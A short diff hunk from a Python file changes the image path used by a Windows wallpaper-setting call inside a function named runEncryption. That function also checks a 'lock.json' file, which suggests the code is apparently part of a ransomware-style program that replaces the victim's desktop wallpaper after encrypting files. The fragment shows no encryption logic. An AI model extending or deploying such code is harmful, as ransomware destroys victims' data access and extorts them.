@@ -113,7 +113,7 @@ class CreateFile:
 
 def runEncryption():
     print("Encryption start")
-    img = os.path.abspath("./images/")
+    img = os.path.abspath("./images/snake.png")
     ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 3)
     cf = CreateFile(testPath)
     cf.checkfile("lock.json")
